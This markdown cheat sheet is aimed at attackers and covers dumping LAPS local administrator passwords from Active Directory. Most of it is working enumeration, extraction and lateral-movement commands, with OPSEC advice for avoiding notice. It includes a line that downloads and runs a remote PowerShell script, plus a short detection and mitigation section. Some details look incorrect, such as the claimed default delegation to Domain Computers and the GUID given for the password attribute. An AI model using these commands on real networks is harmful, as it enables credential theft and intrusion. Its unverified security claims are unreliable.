# <span style="color:rgb(255, 192, 0)">LAPS — Local Administrator Password Solution</span>

LAPS (Local Administrator Password Solution) is Microsoft's solution for managing local admin passwords on domain-joined computers. It stores the local admin password in AD as a confidential attribute (`ms-Mcs-AdmPwd`), which is readable only by authorized users.

**Attack Goal**: Dump the LAPS attribute to get local admin passwords for lateral movement or privilege escalation.

---

## <span style="color:rgb(255, 0, 0)">LAPS in AD</span>

### Extended Attributes
| Attribute | Type | Description |
|-----------|------|-------------|
| `ms-Mcs-AdmPwd` | String | Plaintext local admin password |
| `ms-Mcs-AdmPwdExpirationTime` | Large Integer | When password expires |

### Permission Required
- `Read ms-Mcs-AdmPwd` permission on computer objects
- Default: delegated to `Domain Computers` group (or `LAPS Readers` custom group)
- Domain Admins have read access by default

---

## <span style="color:rgb(0, 176, 240)">Enumeration — Finding LAPS</span>

### Check if LAPS is Installed
```powershell
# Check for LAPS client on machine
Get-ItemProperty 'HKLM:\Software\Policies\Microsoft Services\AdmPwd' | Select-Object *

# Check AD schema for LAPS attributes
Get-ADObject -Filter {ObjectClass -eq 'ms-MCS-AdmPwd'} -Properties *
```

### Find LAPS-Enabled Computers
```powershell
# AD Module
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
    Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
    Select-Object Name, ms-Mcs-AdmPwd
```

### Using LAPSToolkit
```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('http://SERVER/LAPSToolkit.ps1')
```

```powershell
# Find all LAPS readable computers
Get-LAPSComputers

# Find groups with LAPS read access
Find-LAPSDelegatedGroups

# Find extended rights on LAPS attributes (who can read)
Find-AdmPwdExtendedRights
```

### Using PowerView
```powershell
Get-DomainComputer -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
    Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }
```

---

## <span style="color:rgb(146, 208, 80)">Extracting LAPS Passwords</span>

### With AD Module (PowerShell)
```powershell
# Must be run from a domain-joined machine or with remote ADWS
Get-ADComputer -Identity WS001 -Properties ms-Mcs-AdmPwd |
    Select-Object Name, ms-Mcs-AdmPwd
```

### With LAPSToolkit
```powershell
# Find all accessible LAPS passwords
Get-LAPSComputers

# Filter readable
Get-LAPSComputers -Domain contoso.local | Where-Object {$_.Password -ne $null}
```

### With ldapsearch (Kali/Linux)
```bash
# Find computers with LAPS (base domain search)
ldapsearch -x -H ldap://DC01.contoso.local -D "CN=user,CN=Users,DC=contoso,DC=local" -W -b "DC=contoso,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd

# Specific computer
ldapsearch -x -H ldap://DC01.contoso.local -D "user@contoso.local" -W -b "CN=WS001,CN=Computers,DC=contoso,DC=local" ms-Mcs-AdmPwd
```

### With CME (CrackMapExec)
```bash
# Dump LAPS passwords
crackmapexec ldap DC01 -u user -p pass -M laps

# If using hashes
crackmapexec ldap DC01 -u user -H HASH -M laps
```

### With ADSI (PowerShell, No RSAT)
```powershell
$searcher = [ADSISearcher]"(ms-Mcs-AdmPwd=*)"
$searcher.SearchRoot = "LDAP://DC=contoso,DC=local"
$searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd") | Out-Null
$searcher.PageSize = 1000
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Computer = $_.Properties.cn
        Password = $_.Properties.'ms-mcs-admpwd'
    }
}
```

---

## <span style="color:rgb(112, 48, 160)">Abusing LAPS Passwords</span>

### Lateral Movement
```bash
# Use extracted password with CME
crackmapexec smb 192.168.1.0/24 -u Administrator -p 'LAPS_PASSWORD'

# WinRM
evil-winrm -i WS001 -u Administrator -p 'LAPS_PASSWORD'

# RDP
xfreerdp /v:WS001 /u:Administrator /p:'LAPS_PASSWORD'

# PSExec
psexec.py WORKGROUP/Administrator:LAPS_PASSWORD@WS001

# Pass-the-Hash (if NTLM hash cached, but LAPS gives plaintext)
```

### Privilege Escalation
```
1. Get low-priv shell on a machine
2. Check if current user can read LAPS (Find-AdmPwdExtendedRights)
3. Read LAPS password for other machines
4. Use local admin password on other systems
5. Move toward DC with local admin on domain controllers
```

---

## <span style="color:rgb(0, 32, 96)">Delegation Abuses</span>

### Find Who Can Read LAPS
```powershell
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=contoso,DC=local"
```

### Check Specific User/Group
```powershell
# Check if a compromised group can read LAPS
Get-ADGroup -Identity "Help Desk" |
    Get-ADGroupMember |
    ForEach-Object {
        $user = $_
        Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd |
            Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
            Select-Object @{N="User";E={$user.Name}}, @{N="Computer";E={$_.Name}}, @{N="Password";E={$_.'ms-Mcs-AdmPwd'}}
    }
```

---

## <span style="color:rgb(94, 18, 18)">Detection & Prevention</span>

### Event Logs
| Event ID | Source | Description |
|----------|--------|-------------|
| 4662 | Security | Directory Service Access to LAPS attributes |
| 5136 | Security | Modification of LAPS attributes |
| 4688 | Security | Process execution (LDAP queries, PowerShell) |

### Detection Query (Splunk/KQL)
```
index=windows EventCode=4662
Properties="{bf967a86-0de6-11d0-a285-00aa003049e2}"  # ms-Mcs-AdmPwd GUID
```

```
index=windows EventCode=5136
AttributeLDAPDisplayName=ms-Mcs-AdmPwd
```

### Sysmon
- Monitor for `ldapsearch`, `Get-ADComputer`, `AdmPwd*` cmdlets
- Monitor LDAP query volume (many reads to ms-Mcs-AdmPwd)

### Mitigation

| Control | Detail |
|---------|--------|
| Restrict LAPS read | Only delegate `Read ms-Mcs-AdmPwd` to authorized groups |
| Audit delegation | Regularly review who has LAPS read rights |
| Enable password rotation | Ensure LAPS rotates on schedule |
| Remove LAPS from DCs | Do not install LAPS on Domain Controllers |
| Monitor attribute reads | Alert on 4662 for ms-Mcs-AdmPwd |
| Use JIT | Just-in-time access for LAPS read groups |
| LAPS schema extension | Prevent unauthorized schema modifications |

---

## <span style="color:rgb(255, 255, 0)">OPSEC</span>

- LAPS queries are LDAP reads — relatively quiet compared to DCSync
- Default delegation often includes `Domain Computers` (all machine accounts)
- Help Desk groups commonly have LAPS read rights (tier 1 privilege escalation)
- LAPS passwords are NOT hashed — they are stored in plaintext in AD
- Test access with a single target first to avoid noise
- LAPS gives you the **local** Administrator password, not a domain admin account
- Combine with Kerberos attacks if you need DA (e.g., use local admin for Rubeus)
